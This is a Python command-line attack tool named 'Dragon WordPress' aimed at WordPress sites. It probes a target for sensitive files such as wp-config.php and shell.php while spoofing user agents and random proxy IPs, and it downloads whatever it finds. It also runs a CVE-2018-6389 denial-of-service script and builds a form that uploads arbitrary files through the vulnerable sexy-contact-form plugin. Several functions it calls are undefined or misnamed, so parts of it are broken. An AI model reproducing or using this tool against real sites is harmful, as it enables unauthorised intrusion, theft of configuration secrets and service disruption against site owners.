import os
try:
    import time, socket, datetime, sys, random, shutil, requests
    from rich.console import Console
except:
    os.system("pip install datetime")
    os.system("pip install random")
    os.system("pip install requests")
    os.system("pip install rich")
    import time, socket, datetime, sys, random, shutil, requests
    from rich.console import Console

console = Console()


if os.name == 'nt':
    os.system('color F')
    os.system("title Dragon WordPress") 

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def slash_system():
    if os.name == 'nt':
        ccvf = "\ "
        return ccvf[:-1]
    else:
        return "/"


headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}

      
path = os.getcwd()
clear_screen()


#color
class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'

    


class requests_anonymous:
    def fast_get(url):
        try:
            s = socket.gethostbyname("googl.com")
            netok = 'y'
        except:
            netok = 'n'
            return "Error Connecting To Net!"
        if netok == 'y':
            city_fake_ip = ['37', '145', '45', '5', '22', '20']
            socket_fake = ["socks4", "socks5"]
            syatems = ["Linux", "Windows", "Android", "Ios"]
            bws = ["Firefox", "Chrom", "Internet Explorer", "Opera", "Tor"]
            shs = ["Google", "Mozilla"]
            if not 'http://' in url and not 'https://' in url:
                url = ('https://'+url)
            proxy_ip = (str(random.choice(city_fake_ip)) +"."+ str(random.randint(10, 180)) +"."+ str(random.randint(10, 180)) +"."+ str(random.randint(10, 180)))
            proxy = {random.choice(socket_fake): proxy_ip}
            system = (random.choice(syatems))
            bw = (random.choice(bws))
            sh = (random.choice(shs))
            header = {"User-Agent": sh+"/5.0 (X11; "+system+" i686; rv:68.0) Gecko/20100101 "+bw+"/68.0"}
            requests_Output = requests.get(url, proxies=proxy, headers=header)
            return requests_Output
    def get(url, system, Bowers, fake_ip):
        try:
            s = socket.gethostbyname("googl.com")
            netok = 'y'
        except:
            netok = 'n'
            return "Error Connecting To Net!"
        if netok == 'y':
            if not 'http://' in url and not 'https://' in url:
                url = ('https://'+url)
            proxy = {"socks5": str(fake_ip)}
            header = {"User-Agent": "Mozilla/5.0 (X11; "+str(system)+" i686; rv:68.0) Gecko/20100101 "+str(Bowers)+"/68.0"}
            requests_Output = requests.get(url, proxies=proxy, headers=header)
            return requests_Output
    
    def fast_post(url, pyload):
        try:
            s = socket.gethostbyname("googl.com")
            netok = 'y'
        except:
            netok = 'n'
            return "Error Connecting To Net!"
        if netok == 'y':
            if not 'http://' in url and not 'https://' in url:
                url = ('https://'+url)
            city_fake_ip = ['37', '145', '45', '5', '22', '55', '19', '42', '20']
            socket_fake = ["socks4", "socks5"]
            syatems = ["Linux", "Windows", "Android", "Ios"]
            bws = ["Firefox", "Chrom", "Internet Explorer", "Opera", "Tor"]
            shs = ["Google", "Mozilla"]
            if not 'http://' in url and not 'https://' in url:
                url = ('https://'+url)
            proxy_ip = (str(random.choice(city_fake_ip)) +"."+ str(random.randint(10, 180)) +"."+ str(random.randint(10, 180)) +"."+ str(random.randint(10, 180)) +":"+ str(random.randint(50, 8000)))
            proxy = {random.choice(socket_fake): proxy_ip}
            system = (random.choice(syatems))
            bw = (random.choice(bws))
            sh = (random.choice(shs))
            header = {"User-Agent": sh+"/5.0 (X11; "+system+" i686; rv:68.0) Gecko/20100101 "+bw+"/68.0"}
            requests_Output = requests.post(url, pyload=pyload, proxies=proxy, headers=header)
            return requests_Output
    def post(url, pyload, system, Bowers, fake_ip):
        try:
            s = socket.gethostbyname("googl.com")
            netok = 'y'
        except:
            netok = 'n'
            return "Error Connecting To Net!"
        if netok == 'y':
            if not 'http://' in url and not 'https://' in url:
                url = ('https://'+url)
            proxy = {"socks5": str(fake_ip)}
            header = {"User-Agent": "Mozilla/5.0 (X11; "+str(system)+" i686; rv:68.0) Gecko/20100101 "+str(Bowers)+"/68.0"}
            requests_Output = requests.post(url, pyload=pyload, proxies=proxy, headers=header)
            return requests_Output

    def check_On(Target):
        try:
            s = socket.gethostbyname("googl.com")
            netok = 'y'
        except:
            netok = 'n'
            return "Error Connecting To Net!"
        if netok == 'y':
            if "a" in Target or "b" in Target or "c" in Target or "d" in Target or "e" in Target or "f" in Target or "g" in Target or "h" in Target or "i" in Target or "j" in Target or "k" in Target or "l" in Target or "m" in Target or "n" in Target or "o" in Target or "p" in Target or "q" in Target or "r" in Target or "s" in Target or "t" in Target or "u" in Target or "v" in Target or "w" in Target or "x" in Target or "y" in Target or "z" in Target:
                try:
                    Target = socket.gethostbyname(Target)
                except:
                    return "Site Is Off"
            try:
                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.settimeout(0.8)
                save = sock.connect_ex((str(Target), 80))
                if save == 0:
                    return "Site Is On"
                if save != 0:
                    return "Site Is Off"
                sock.close()
            except:
                return "Site Is Off"


    def send_paket(Ip, Port, TimeOut, Paket):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(TimeOut)
            save = sock.connect_ex((str(Ip), int(Port)))
            if save == 0:
                sock.sendto(bytes(str(Paket),"UTF-8"), (str(Ip), int(Port)))
                return 0
            if save != 0:
                return "Error Coonecting To Target!"
            sock.close()
        except:
            return "Error Work!"
    

    def check_net():
        try:
            socket.gethostbyname("googl.com")
            return "True"
        except:
            return "False"
# ========================







class webinfo():
    def get_promming(Target):
        if not "https://" in Target.lower() and not "http://" in Target.lower():
            Target = ("http://"+Target)
        # =========================Get PL=========================
        php_test = requests.get(Target+"/index.php")
        html_test = requests.get(Target+"/index.html")
        dart_test = requests.get(Target+"/index.dart")
        java_test = requests.get(Target+"/index.java")
        js_test = requests.get(Target+"/index.js")
        if php_test.status_code == 200:
            pl = ("php")
        elif html_test.status_code == 200:
            pl = ("html")
        elif dart_test.status_code == 200:
            pl = ("dart")
        elif java_test.status_code == 200:
            pl = ("java")
        elif js_test.status_code == 200:
            pl = ("js")
        else:
            pl = ("Access is prohibited!")
        return pl
        
# / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /

    def get_cms(Target):
        if not "https://" in Target.lower() and not "http://" in Target.lower():
            Target = ("http://"+Target)
        # =========================Get Cms=========================
        try:
            wp_test1 = requests.get(Target+"/wp-includes/ID3/license.commercial.txt")
            wp_test2 = requests.get(Target+"/wp-includes/sodium_compat/composer.json")
            wp_test3 = requests.get(Target+"/license.txt")
            wp_test4 = requests.get(Target+"/wp-includes/wlwmanifest.xml")
            if wp_test1.status_code != 404 or wp_test2.status_code != 404 or wp_test3.status_code != 404 or wp_test4.status_code != 404:
                cms = ("WordPress")
            else:
                cms = ("Access is prohibited!")
        except:
            cms = ("Error")
        return cms
        
# / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /

    def chek_install_plugin(Target, plugin_name):
        if not "https://" in Target.lower() and not "http://" in Target.lower():
            Target = ("http://"+Target)
        try:
            ceck = requests.get(Target+"/wp-content/plugins/{}/readme.txt".format(plugin_name))
            if ceck.status_code != 404:
                return "True"
            else:
                return "False"
        except:
            return "Error"
        
# / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /

    def get_blogs(Target):
        if not "https://" in Target.lower() and not "http://" in Target.lower():
            Target = ("http://"+Target)
        # =========================Get PL=========================
        try:
            php_test = requests.get(Target+"/index.php")
            html_test = requests.get(Target+"/index.html")
            dart_test = requests.get(Target+"/index.dart")
            java_test = requests.get(Target+"/index.java")
            js_test = requests.get(Target+"/index.js")
            if php_test.status_code == 200:
                pl = ("php")
            elif html_test.status_code == 200:
                pl = ("html")
            elif dart_test.status_code == 200:
                pl = ("dart")
            elif java_test.status_code == 200:
                pl = ("java")
            elif js_test.status_code == 200:
                pl = ("js")
            else:
                pl = ("Access is prohibited!")
        except:
            pl = ("Error")
        # =========================Get Cms=========================
        try:
            wp_test = requests.get(Target+"/wp-includes/ID3/license.commercial.txt")
            wp_test2 = requests.get(Target+"/wp-includes/sodium_compat/composer.json")
            if wp_test.status_code != 404 or wp_test2.status_code != 404:
                cms = ("WordPress")
            else:
                cms = ("Access is prohibited!")
        except:
            cms = ("Error")
        
        return [pl, cms]
# ==============================================================






def Dragon_WordPress():
    path = os.getcwd()
    clear_screen()
    def bbbbbbbbnnr():
        print("""

 ____                              
|  _ \ _ __ __ _  __ _  ___  _ __  
| | | | '__/ _` |/ _` |/ _ \| '_ \ 
| |_| | | | (_| | (_| | (_) | | | |
|____/|_|  \__,_|\__, |\___/|_| |_|
                 |___/
__        __            _ ____ 
\ \      / /__  _ __ __| |  _ \ _ __ ___  ___ ___ 
 \ \ /\ / / _ \| '__/ _` | |_) | '__/ _ \/ __/ __|
  \ V  V / (_) | | | (_| |  __/| | |  __/\__ \__ \ 
   \_/\_/ \___/|_|  \__,_|_|   |_|  \___||___/___/


CoDeD By Mr.TaHa
GitHub: https://github.com/mr-r0ot


""")
    bbbbbbbbnnr()
    Target = str(input(" Enter Target(googl.com or googl.com/wp-includes/...): "))
    

    
    file_finded = []
    folder_finded = []
    while True:
        clear_screen()
        bbbbbbbbnnr()
        Target_test = Target.split("/")[0]
        Target_test_w = ("http://"+Target_test)
        print(Target_test_w)

        if webinfo.get_cms(Target_test_w) == "WordPress":
            console.print(" [+] The goal is WordPress type!\n", style="bold green")
        else:
            console.print("\n\n\n\n [-] The goal is not WordPress type!", style="bold red")
            input("\n\n\n\n\t  Enter for close ")
            clear_screen()
            break


        if not "https://" in Target.lower() and not "http://" in Target.lower():
            Target = ("http://"+Target)



        



        while True:
            clear_screen()
            def bbbnnnrrr():
                clear_screen()
                bbbbbbbbnnr()
                Selct = str(input("""



   1 --->  **Simulation of the target website server host!**
   2 ---> Get Login Page WebSite
   3 ---> Get Info Target
   4 ---> Get index file Of Target
   5 ---> DOne WordPress WebSite under 4.9.3 
   6 ---> Upload File On Server Target
   7 --->  **Check Installing Plugin From WordPress**
   8 ---> Get Cms Target
   9 ---> Get Programming language Target

  


  0 --> Exit


 ===> """))
                return Selct
    
        
            sssss = bbbnnnrrr()
            if sssss == "0":
                break
            elif sssss == "1":
                clear_screen()
                bbbbbbbbnnr()
                Defalt_file_host = [
        "g",
        "index.php", "info.php", "xmlrpc.php", "wp-trackback.php", "wp-signup.php", "wp-settings.php", ".htaccess",
        "wp-mail.php", "wp-login.php", "wp-load.php", "wp-links-opml.php", "wp-cron.php", "license.commercial.txt",
        "wp-config-sample.php", "wp-comments-post.php", "wp-blog-header.php", "wp-activate.php",
        "readme.html", "wp-config.php", "noid-wow.php", "shell.php", "ip.php", "pass.php", "license.txt",
        "password.php", "security.php", "wp.php", "admin.php", "admin-filters.php", "ajax-actions.php",
        "bookmark.php", "class-automatic-upgrader-skin.php", "class-bulk-plugin-upgrader-skin.php",
        "class-bulk-theme-upgrader-skin.php", "class-bulk-upgrader-skin.php", "class-core-upgrader.php",
        "about.php", "import.php", "link.php", "media-upload.php", "user-new.php", "upload.php", "readme.txt",
        "class-custom-background.php", "class-custom-image-header.php", "class-file-upload-upgrader.php",
        "class-ftp.php", "class-ftp-sockets.php", "class-plugin-installer-skin.php", "class-plugin-upgrader.php",
        "class-plugin-upgrader-skin.php", "class-theme-installer-skin.php", "class-walker-category-checklist.php",
        "class-wp-application-passwords-list-table.php", "class-wp-importer.php", "class-wp-upgrader.php",
        "file.php", "image.php", "image-edit.php", "import.php", "list-table.php", "menu.php", "network.php",
        "plugin.php", "plugin-install.php", "post.php", "theme.php", "theme-install.php", "updates.js",
        "theme.js", "media.js", "akismet.js", "views", "wrapper.php", "readme.txt", "LICENSE.txt", "changelog.txt",
        "akismet.php", "404.php", "comments.php", "header.php", "2020-landscape-1.png", "2020-three-quarters-2.png",
        "2020-three-quarters-1.png", "block-patterns.php", "svg-icons.php", "template-tags.php", "screenshot.png",
        "readme.txt", "Diff.php", "Renderer.php", "inline.php", "xdiff.php", "shell.php", "native.php", "string.php",
        "align.php", "border.php", "colors.php", "custom-classname.php", "dimensions.php", "duotone.php", "elements.php",
        "generated-classname.php", "layout.php", "spacing.php", "typography.php", "utils.php", "ca-bundle.crt"
        "style.css", "style.min.css", "style-rtl.css", "style-rtl.min.css", "common.css", "common.min.css", "common-rtl.css",
        "common-rtl.min.css", "editor.css", "editor.min.css", "editor-rtl.css", "editor-rtl.min.css", "reset.css", "reset.min.css",
        "style.css", "theme.css", "theme.min.css", "admin-bar.css", "buttons.css", "customize-preview.css", "dashicons.css",
        "editor.css", "jquery-ui-dialog.css", "media-views.css", "wp-auth-check.css", "wp-auth-check.min.css", "wp-embed-template.css",
        "wp-pointer.css", "class-wp-customize-background-image-control.php", "class-wp-customize-background-image-setting.php",
        "class-wp-customize-background-position-control.php", "class-wp-customize-code-editor-control.php", "class-wp-customize-color-control.php",
        "class-wp-customize-cropped-image-control.php", "class-wp-customize-custom-css-setting.php", "class-wp-customize-date-time-control.php",
        "class-wp-customize-filter-setting.php", "class-wp-customize-header-image-control.php", "class-wp-customize-media-control.php",
        "class-wp-customize-nav-menu-auto-add-control.php", "class-wp-customize-nav-menu-control.php", "class-wp-customize-nav-menu-locations-control.php",
        "class-wp-customize-partial.php", "class-wp-customize-selective-refresh.php", "class-wp-customize-site-icon-control.php", "class-wp-widget-area-customize-control.php",
        "dashicons.eot", "dashicons.svg", "dashicons.ttf", "dashicons.woff", "dashicons.woff2", "getid3.lib.php", "getid3.php",
        "module.audio.ac3.php", "module.audio.dts.php", "module.audio.flac.php", "module.audio.mp3.php", "module.audio.ogg.php",
        "module.audio-video.asf.php", "module.audio-video.flv.php", "module.audio-video.matroska.php", "module.tag.apetag.php",
        "module.tag.id3v1.php", "module.tag.id3v2.php", "admin-bar-sprite.png", "admin-bar-sprite-2x.png", "arrow-pointer-blue.png",
        "arrow-pointer-blue-2x.png", "blank.gif", "down_arrow.gif", "down_arrow-2x.gif", "icon-pointer-flag.png", "icon-pointer-flag-2x.png",
        "rss.png", "rss-2x.png", "spinner.gif", "spinner-2x.gif", "toggle-arrow.png", "toggle-arrow-2x.png", "uploader-icons.png",
        "uploader-icons-2x.png", "w-logo-blue.png", "w-logo-blue-white-bg.png", "wpicons.png", "wpicons-2x.png", "wpspin.gif",
        "wpspin-2x.gif", "xit.gif", "xit-2x.gif", "archive.png", "audio.png", "code.png", "default.png", "document.png",
        "interactive.png", "spreadsheet.png", "text.png", "video.png", "frownie.png", "rolleyes.png", "simple-smile.png",
        "mrgreen.png", "icon_arrow.gif", "icon_biggrin.gif", "icon_eek.gif", "icon_exclaim.gif", "icon_evil.gif",
        "wp-comments.png", "wp-icon.png", "wp-watermark.png", "class-IXR-base64.php", "class-IXR-client.php",
        "class-IXR-date.php", "class-IXR-error.php", "class-IXR-message.php", "class-IXR-server.php",
        "codemirror.min.css", "codemirror.min.js", "csslint.js", "esprima.js", "fakejshint.js", "htmlhint.js"
        "cropper.css", "cropper.js", "marqueeHoriz.gif", "marqueeVert.gif", "react-refresh-entry.js", "react-refresh-entry.min.js",
        "react-refresh-runtime.js", "lodash.js", "moment.js", "wp-polyfill.js", "a11y.js", "api-fetch.js", "blob.js",
        "components.js", "data.js", "dom.js", "editor.js", "hooks.js", "i18n.js", "keycodes.js", "nux.js", "url.js",
        "border-anim-h.gif", "imgareaselect.css", "jquery.imgareaselect.js", "Jcrop.gif", "suggest.js", "mediaelement-migrate.js",
        "mediaelementplayer.css", "mejs-controls.png", "mejs-controls.svg", "wp-mediaelement.min.css", "wp-playlist.js",
        "handlers.js", "loadingAnimation.gif", "macFFBgHack.png", "thickbox.css", "thickbox.js", "wp-tinymce.php", "wp-langs-en.js",
        "plugin.js", "editable_selects.js", "json2.js", "readonly.php", "SMTP.php", "PHPMailer.php", "Exception.php", "entry.php",
        "error_polyfill.php", "Basic.php", "Jar.php", "HTTP.php", "Headers.php", "cURL.php", "CaseInsensitiveDictionary.php",
        "IPv6.php", "SSL.php", "freedoms.php", "profile.php", "autoload-php7.php", "options-general.php"
        ""]
        
                Defalt_folder_host = [
"wp-admin", "wp-content", "wp-includes", "wp", "plugins", "security",
"sql", "mysql", "mail", "webmail", "info", "host", "server1", "themes", "fonts",
"webdisk", "server", "css", "images", "includes", "js", "widgets", "ID3",
"maint", "network", "user", "img", "_inc", "twentytwentytwo", "twentytwentyone",
"twentytwenty", "assets", "classes", "inc", "template-parts", "templates",
"fonts", "inter", "template-parts", "Diff", "Renderer", "Engine", "block-patterns",
"blocks", "block-supports", "certificates", "certificates", "css", "disk", "block-directory",
"block-library", "customize-widgets", "editor", "edit-post", "edit-site", "format-library",
"nux", "edit-widgets", "list-reusable-blocks", "reusable-blocks", "customize", "wlw",
"smilies", "media", "crystal", "IXR", "codemirror", "crop", "dist", "imgareaselect",
"jcrop", "jquery", "mediaelement", "plupload", "swfupload", "thickbox", "tinymce",
"development",  "vendor", "ui", "ux", "langs", "plugins", "skins", "themes", "charmap",
"colorpicker", "fullscreen", "link", "textcolor", "wpview", "wplink", "wpgallery", "wpemoji",
"lightgray", "utils", "php-compat", "PHPMailer", "pomo", "Requests", "Auth", "Cookie", "Exception",
"HTTP", "Proxy", "Response", "Transport", "Utility", "rest-api", "endpoints", "fields", "SimplePie",
"lib", "namespaced", "src", "audio"
""]

                for file_name in Defalt_file_host:
                    try:
                        res = requests_anonymous.fast_get(Target+"/"+file_name)
                        if res.status_code != 404:
                            console.print(" [+] Find {} File!".format(file_name), style="bold green")
                            file_finded.append(file_name)
                        else:
                            console.print(" [-] NotFind New File!", style="bold red")
                    except:
                        console.print(" [!] ErrorFind New File!", style="bold red")
            
                for file_name in Defalt_folder_host:
                    try:
                        res = requests_anonymous.fast_get(Target+"/"+file_name)
                        if res.status_code != 404:
                            console.print(" [+] Finded New Folder!", style="bold green")
                            folder_finded.append(file_name)
                        else:
                            console.print(" [-] NotFind New Folder!", style="bold red")
                    except:
                        console.print(" [!] ErrorFind New Folder!", style="bold red")


                clear_screen()
                bbbbbbbbnnr()
                print("""

  ========Copy File Of Server Target========


""")
                for fiiille in folder_finded:
                    print("   "+str(fiiille))
                print("\n")
                for fiiille in file_finded:
                    print("   "+str(fiiille))


                selllc = str(input("\n\n\n\n ===> "))



                for fiiille in file_finded:
                    if fiiille == selllc:
                        path_save = str(input(" Enter Path For Copy File: "))
                        try:
                            tes = requests.get(Target+"/"+fiiille)
                            content = tes.content
                            content = content.decode()
                            fff = open(path_save+slash_system()+fiiille, "w+")
                            fff.write(content)
                            fff.close()
                            console.print(" [+] Copying!", style="bold green")
                            time.sleep(2)
                        except:
                            console.print(" [-] Cant Copying!", style="bold red")
                            time.sleep(2)



            elif sssss == "2":
                clear_screen()
                bbbbbbbbnnr()
                try:
                    res = requests_anonymous.fast_get(Target+"/wp-admin")
                    if res.status_code == 200:
                        console.print("""

    ########################################
    #                                      #
    #                                      #
    #  WebSiteLogin:  {}/wp-admin
    #                                      #
    #                         Buy DarkUp   #
    ########################################

""".format(Target), style="bold green")

                    else:
                        console.print(" [-] Cant Find WebSiteLogin!", style="bold red")
                except:
                    console.print(" [-] Error Find WebSiteLogin!", style="bold red")
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()




            elif sssss == "3":
                clear_screen()
                bbbbbbbbnnr()
                path = os.getcwd()
                try:
                    tes = requests.get(Target+"/info.php")
                    if tes.status_code == 200:
                        content = tes.content
                        content = content.decode()
                        fff = open(path+slash_system()+"info_Target.html", "w+")
                        fff.write(content)
                        fff.close()
                        console.print(" [+] Copying!", style="bold green")
                        os.startfile(path+slash_system()+"info_Target.html")
                        console.print(" [+] Running!", style="bold green")
                    else:
                        console.print(" [-] Cant Info WebSiteLogin!", style="bold red")
                except:
                    console.print(" [-] Cant Copying or Runnig!", style="bold red")
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()






            elif sssss == "4":
                clear_screen()
                bbbbbbbbnnr()
                path_save = str(input(" Enter Path For Copy File: "))
                try:
                    tes = requests.get(Target+"/index.php")
                    if tes.status_code == 200:
                        content = tes.content
                        content = content.decode()
                        fff = open(path_save+slash_system()+"index.html", "w+")
                        fff.write(content)
                        fff.close()
                        console.print(" [+] Copying!", style="bold green")
                    else:
                        console.print(" [-] Cant Info WebSiteLogin!", style="bold red")
                except:
                    console.print(" [-] Cant Copying or Runnig!", style="bold red")
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()



            elif sssss == "5":
                clear_screen()
                path = os.getcwd()
                os.chdir(path+slash_system()+"DarkUp Tools"+slash_system()+"CVE-2018-6389")
                try:
                    os.system("python CVE-2018-6389.py")
                except:
                    pass
                os.chdir(path)
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()


            elif sssss == "6":
                Target_For_send = Target
                uf = open("Send_File_To_Site_SCRIPT.html", "w+")
                uf.write('''
<form method="POST" action="
http://'''+Target_For_send+'''/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php"
enctype="multipart/form-data">
<input type="file" name="files[]" /><button>Upload</button>
</form>
''')
                uf.close()
                os.startfile("Send_File_To_Site_SCRIPT.html")
                print("\n\n\n****StArTiNg!****")
                input("\n\n\n\n\t  Enter for close ")
                try:
                    os.remove("Send_File_To_Site_SCRIPT.html")
                except:
                    pass
                clear_screen()




            elif sssss == "7":
                clear_screen()
                bbbbbbbbnnr()
                pluginname = str(input(" Enter Name Plugin: "))
                retinst =  webinfo.check_install_plugin(Target=Target, plugin_name=pluginname)
                if retinst == "True":
                    console.print(" Plugin Installed!", style="bold green")
                elif retinst == "False":
                    console.print(" Plugin Not Installed!", style="bold red")
                else:
                    console.print(" Error IN checking", style="bold red")

                input("\n\n\n\n\t  Enter for close ")
                clear_screen()



            elif sssss == "8":
                clear_screen()
                bbbbbbbbnnr()
                print(" Your Target Cms Is: "+webinfo.get_cms(Target))
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()


            elif sssss == "9":
                clear_screen()
                bbbbbbbbnnr()
                print(" Your Target Programming_language Is: "+webinfo.get_Programming_language(Target))
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()







        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        break
# =================================================================================================================

Dragon_WordPress()
